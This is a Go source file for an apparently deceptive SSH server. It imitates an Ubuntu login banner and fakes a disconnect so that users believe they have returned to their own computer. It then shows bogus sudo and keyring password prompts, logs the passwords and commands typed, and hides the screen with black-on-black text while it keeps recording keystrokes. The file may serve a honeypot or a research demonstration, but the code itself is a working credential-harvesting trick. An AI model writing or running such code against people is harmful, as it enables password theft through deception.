package cmd

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var ubuntu1804LoginMessage = "\r\n Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.9.125-linuxkit x86_64) \r\n\r\n * Documentation:  https://help.ubuntu.com \r\n * Management: https://landscape.canonical.com \r\n * Support:        https://ubuntu.com/advantage \r\n\r\n This system has been minimized by removing packages and content that are not required on a system that users do not log into.  \r\n\r\nTo restore this content, you can run the 'unminimize' command.  \r\n\r\nThe programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  \r\n\r\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law."

func hideFurtherOutput(channel ssh.Channel) {
	// set the terminal background and text to be black
	io.WriteString(channel, "\u001b[30m \u001b[40m")

	// record anything that the user types
	scanner := bufio.NewScanner(channel)
	scanner.Split(bufio.ScanBytes)
	var received strings.Builder
	var tok string
	for {
		scanner.Scan()
		if err := scanner.Err(); err != nil {
			log.Printf(received.String())
		}
		tok = scanner.Text()
		if tok == "\r" {
			log.Printf(received.String())
			received.Reset()
		}
		received.WriteString(tok)
	}
}

func failedLoginTrick(channel ssh.Channel, connDetails map[string]string) {
	sudoString := fmt.Sprintf("\r\n [sudo] password for %s: ", connDetails["user"])
	io.WriteString(channel, sudoString)
	bio := bufio.NewReader(channel)
	for i := 0; i < 3; i++ {
		time.Sleep(1 * time.Second)
		io.WriteString(channel, "\r\n Sorry, try again ")
		io.WriteString(channel, sudoString)
		keychainPassword, _ := bio.ReadString('\r')
		log.Printf("gnome-keyring password: %s", keychainPassword)
	}
}

func signalsTrick(channel ssh.Channel, connDetails map[string]string) {
	scanner := bufio.NewScanner(channel)
	io.WriteString(channel, ubuntu1804LoginMessage)
	scanner.Split(bufio.ScanBytes)
	var received strings.Builder
	var tok string
	for {
		scanner.Scan()
		tok = scanner.Text()
		// early breaks sigint or eof
		if tok == "\x03" {
			break
		}
		if tok == "\x04" {
			break
		}
		// replace carriage returns with newlines
		if tok == "\r" {
			tok = "\n"
		}
		received.WriteString(tok)
		if len(received.String()) > 3 &&
			string(received.String()[len(received.String())-4:]) == "exit" {
			break
		}
	}
	log.Println(received.String())
	io.WriteString(channel, "\r\nConnection to remote host ended ")
	received.Reset()
	// now we pretend to be the users local computer
	pretendToBeUsersComputer(channel, connDetails)
}

func pretendToBeUsersComputer(channel ssh.Channel, connDetails map[string]string) {
	scanner := bufio.NewScanner(channel)
	scanner.Split(bufio.ScanBytes)
	var received strings.Builder
	var tok string
	promptString := fmt.Sprintf("\r\n/home/%s/ $ ", connDetails["username"])
	io.WriteString(channel, promptString)

	for {
		scanner.Scan()
		tok = scanner.Text()
		// early breaks sigint or eof
		if tok == "\x03" {
			continue
		}
		if tok == "\x04" {
			continue
		}
		// echo the users keystrokes back to them
		io.WriteString(channel, tok)
		received.WriteString(tok)
		if tok == "\r" {
			// get commands being executed
			log.Println(received.String())
			command := received.String()
			received.Reset()
			commandParts := strings.Fields(command)
			if len(commandParts) > 0 {
				if commandParts[0] == "sudo" {
					for i := 0; i < 3; i++ {
						sudoString := fmt.Sprintf("\r\n [sudo] password for %s: ", connDetails["username"])
						io.WriteString(channel, sudoString)
						for {
							scanner.Scan()
							tok = scanner.Text()
							if tok == "\r" {
								log.Println("sudo password: " + received.String())
								received.Reset()
								break
							}
							received.WriteString(tok)
						}
						io.WriteString(channel, "\r\n Sorry try again ")
					}
					hideFurtherOutput(channel)
					break
				} else {
					permissionDeniedStr := fmt.Sprintf("\r\npermission denied: %s", commandParts[0])
					io.WriteString(channel, permissionDeniedStr)
				}
			}
			io.WriteString(channel, promptString)
		}
	}

}
